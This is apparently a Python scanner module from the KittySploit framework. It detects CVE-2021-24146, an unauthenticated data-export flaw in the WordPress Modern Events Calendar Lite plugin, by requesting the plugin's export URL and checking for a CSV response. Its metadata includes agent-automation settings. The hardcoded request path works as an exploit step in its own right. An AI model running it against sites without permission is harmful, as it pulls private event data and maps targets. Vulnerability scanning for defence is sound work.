#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Modern Events Calendar Lite before 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Modern Events Calendar Lite <5.16.5 - Sensitive Information Disclosure Detection',
        'description': 'WordPress Modern Events Calendar Lite before 5.16.5 does not properly restrict access to the export files, allowing unauthenticated users to exports all events data in CSV or XML format.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wpscan', 'packetstorm', 'wordpress', 'wp-plugin', 'webnus', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/c7b1ebd6-3050-4725-9c87-0ea525f8fecc',
            'http://packetstormsecurity.com/files/163345/WordPress-Modern-Events-Calendar-5.16.2-Information-Disclosure.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24146',
            'https://github.com/Hacker5preme/Exploits',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-24146',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=csv', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('mec-events', 'text/csv',)
        if (all(m in headers for m in header_all)):
            self.set_info(
                severity='high',
                reason="WordPress Modern Events Calendar Lite <5.16.5 - Sensitive Information Disclosure detected",
                path='/wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=csv',
            )
            return True
        return False

